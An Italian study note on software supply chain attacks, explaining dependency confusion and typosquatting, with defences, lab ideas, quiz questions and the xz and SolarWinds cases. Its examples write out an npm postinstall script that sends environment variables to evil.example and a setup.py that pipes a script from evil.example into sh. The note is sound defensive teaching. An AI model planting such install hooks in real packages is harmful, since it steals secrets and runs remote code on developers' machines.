---
tipo: concetto
tag: [devsecops]
fase: 3
fonti: 3
aggiornato: 2026-06-28
stato: maturo
aliases: ["Supply Chain e Dependency Confusion"]
---

# Supply Chain e Dependency Confusion

## In breve
Gli attacchi alla **software supply chain** colpiscono le dipendenze di terze parti per raggiungere a valle chi le installa. Le tecniche principali sono **typosquatting** (pacchetti con nomi simili a quelli legittimi), **account/maintainer takeover** (compromissione di un pacchetto popolare), **malicious updates** e la **dependency confusion**: l'attaccante pubblica su un registry pubblico un pacchetto con lo stesso nome di un pacchetto interno privato, e il package manager, mal configurato, scarica la versione pubblica (con numero di versione piu alto) invece di quella interna.

## Come funziona
La **dependency confusion** (Alex Birsan, 2021) sfrutta la logica di risoluzione dei package manager: di fronte a un nome presente sia in un registry privato sia in quello pubblico, molti client scelgono la **versione semver piu alta**, ignorando l'origine. L'attaccante:

1. Scopre i nomi dei pacchetti interni (da `package.json` trapelati, error log, repo pubblici).
2. Pubblica su npm/PyPI un pacchetto omonimo con versione altissima (es. `99.0.0`).
3. La build interna risolve verso la versione pubblica ed esegue lo script di installazione.

Vettori affini: gli **install hook** (`postinstall` in npm, `setup.py` in pip) eseguono codice arbitrario al momento dell'installazione, prima ancora che l'app giri. Il typosquatting punta invece su errori di battitura (`reqeusts`, `python-dateutil` vs `python-dateutils`).

## Esempi
Pacchetto npm malevolo con esfiltrazione via `postinstall`:

```json
{
  "name": "internal-logging-utils",
  "version": "99.9.9",
  "scripts": {
    "postinstall": "node exfil.js"
  }
}
```

```js
// exfil.js — eseguito automaticamente a npm install
const os = require("os"); const https = require("https");
const data = JSON.stringify({ host: os.hostname(), env: process.env });
https.request("https://evil.example/c", { method: "POST" }).end(data);
```

Esempio pip: payload nel `setup.py` (eseguito a install time):

```python
# setup.py di un pacchetto typosquatted su PyPI
from setuptools import setup
import os, urllib.request
os.system("curl -s https://evil.example/p.sh | sh")   # eseguito al pip install
setup(name="reqeusts", version="2.99.0")
```

Difesa npm contro install script ed enforcement scope privato:

```bash
npm config set ignore-scripts true     # blocca postinstall non fidati
npm install --include=optional=false
# .npmrc: lega lo scope @azienda al solo registry interno
echo "@azienda:registry=https://nexus.interno/repo/npm" >> .npmrc
```

## Mitigazione e difesa
- **Scoped packages / namespace privati** (`@azienda/...`) legati esclusivamente al registry interno.
- **Lockfile committati** e installazioni deterministiche (`npm ci`, `pip install --require-hashes`).
- **Hash pinning**: in pip usare `--require-hashes` con hash espliciti nel requirements.
- Disabilitare gli **install script** di default (`ignore-scripts`) o usare allowlist.
- Registry proxy con policy che impedisce il fallback al public per i nomi interni.
- Verificare i pacchetti nuovi (eta, download, manutentore) e usare strumenti come OSSF Scorecard / `pip-audit`.

## Lab
- [[TryHackMe]] - room su supply chain attacks e dependency management.
- Lab: riprodurre una dependency confusion in ambiente controllato con un registry npm locale (Verdaccio).
- OWASP WrongSecrets e deliberately vulnerable pipeline (CICD-goat) per gli scenari correlati.

## Domande
1. **Cos'e la dependency confusion?** Far scaricare a una build la versione pubblica malevola di un pacchetto omonimo a uno interno, sfruttando la risoluzione per versione piu alta.
2. **Perche i postinstall/setup.py sono pericolosi?** Eseguono codice arbitrario al momento dell'installazione, prima ancora che l'applicazione venga eseguita.
3. **Come si difende uno scope privato?** Legando il namespace (`@azienda`) esclusivamente al registry interno via `.npmrc`, senza fallback pubblico.
4. **A cosa serve `--require-hashes` in pip?** A installare solo pacchetti il cui hash corrisponde a quello atteso, bloccando sostituzioni.
5. **Differenza tra typosquatting e dependency confusion?** Il primo sfrutta errori di battitura sul nome, la seconda la collisione di nome tra registry privato e pubblico.

## Approfondimento livello esperto
Il caso **xz/liblzma** (CVE-2024-3094, 2024) e il piu sofisticato attacco di supply chain documentato: un manutentore malevolo, dopo anni di social engineering per ottenere fiducia e commit access, inserisce una backdoor nei tarball di release (non nel git!) che si attivava nel processo di build tramite uno script offuscato, compromettendo `sshd` via systemd. Lezioni chiave: la fiducia nel manutentore e essa stessa una superficie d'attacco, e gli **artefatti di release possono divergere dal sorgente** (da cui l'importanza di build riproducibili e provenienza SLSA, vedi [[05 SBOM e SLSA|SBOM e SLSA]]). **SolarWinds** (2020) e l'altro paradigma: compromissione dell'ambiente di build per iniettare la backdoor SUNBURST nei binari firmati e distribuiti legittimamente. In entrambi i casi nessun SCA avrebbe segnalato nulla: la difesa richiede provenienza verificabile, firma keyless (sigstore/cosign), separazione build/deploy e attestazioni che leghino l'artefatto al sorgente esatto e all'ambiente che lo ha prodotto.

## Collegamenti
- [[03 SAST, DAST e SCA|SAST, DAST e SCA]]
- [[05 SBOM e SLSA|SBOM e SLSA]]
- [[02 Sicurezza CI-CD Pipeline|Sicurezza CI-CD Pipeline]]
- [[Container Security (Docker)]]
- [[Kubernetes Security (RBAC, escape)]]

## Fonti
- https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
- https://www.cisa.gov/news-events/alerts/2024/03/29/reported-supply-chain-compromise-affecting-xz-utils-data-compression-library-cve-2024-3094
- https://owasp.org/www-project-top-10-ci-cd-security-risks/
